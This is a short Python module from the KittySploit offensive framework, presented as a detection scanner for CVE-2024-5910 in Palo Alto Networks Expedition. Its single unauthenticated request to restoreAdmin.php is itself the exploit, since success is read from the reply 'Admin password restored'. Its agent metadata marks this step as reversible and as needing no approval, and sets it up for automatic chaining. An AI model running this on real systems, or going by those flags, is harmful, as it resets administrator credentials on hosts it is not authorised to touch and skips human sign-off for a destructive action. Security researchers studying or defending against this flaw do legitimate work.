#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Missing authentication for a critical function in Palo Alto Networks Expedition can lead to an Expedition admi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Palo Alto Expedition - Admin Account Takeover Detection',
        'description': 'Missing authentication for a critical function in Palo Alto Networks Expedition can lead to an Expedition admin account takeover for attackers with network access to Expedition.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'palo-alto', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise',
            'https://security.paloaltonetworks.com/CVE-2024-5910',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-5910',
        ],
        'cve': 'CVE-2024-5910',
    }

    def run(self):
        r = self.http_request(method="GET", path='/OS/startup/restore/restoreAdmin.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Admin user found', 'Admin password restored',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Palo Alto Expedition - Admin Account Takeover detected",
                path='/OS/startup/restore/restoreAdmin.php',
            )
            return True
        return False

